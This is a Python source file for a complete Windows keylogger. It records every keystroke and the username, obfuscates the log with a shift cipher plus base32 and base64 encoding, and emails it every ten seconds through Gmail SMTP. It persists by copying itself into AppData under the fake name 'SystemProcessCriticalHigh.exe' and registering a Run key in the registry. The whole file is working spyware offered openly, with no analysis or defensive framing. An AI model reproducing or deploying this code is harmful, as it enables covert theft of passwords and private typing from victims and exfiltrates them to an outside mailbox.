import keyboard, os, subprocess, sys, shutil
import smtplib, base64
from threading import Timer
from datetime import datetime
from getpass import getuser

class Cipher:
    def encrypt(plain_text, key=16):
        encrypted = ""
        for c in plain_text:
            if c.isupper():
                c_index = ord(c) - ord('A')
                c_shifted = (c_index + key) % 26 + ord('A')
                c_new = chr(c_shifted)
                encrypted += c_new
            elif c.islower():
                c_index = ord(c) - ord('a') 
                c_shifted = (c_index + key) % 26 + ord('a')
                c_new = chr(c_shifted)
                encrypted += c_new
            elif c.isdigit():
                c_new = (int(c) + key) % 10
                encrypted += str(c_new)
            else:
                encrypted += c
        encrypted = base64.b64encode(base64.b32encode(bytes(encrypted, encoding='utf-8')))
        return encrypted

SEND_REPORT_EVERY = 10
EMAIL_ADDRESS = ""
EMAIL_PASSWORD = r""
SEND_EMAIL = r""

class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name
    
    def sendmail(self, to_email, email, password, message):
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, to_email, message)
        server.quit()

    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.log += str(getuser()) + f"\n{self.start_dt} - {self.end_dt}\n" 
            self.sendmail(SEND_EMAIL, EMAIL_ADDRESS, EMAIL_PASSWORD, Cipher.encrypt(plain_text=self.log, key=16))
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()

def run_at_startup():
    location = os.environ["appdata"] + "\\SystemProcessCriticalHigh.exe"
    if not os.path.exists(location):
        shutil.copyfile(sys.executable, location)
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v SystemProcessCriticalHigh /t REG_SZ /d "' + location + '"', shell=True)


if __name__ == "__main__":
    run_at_startup()
    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
    keylogger.start()


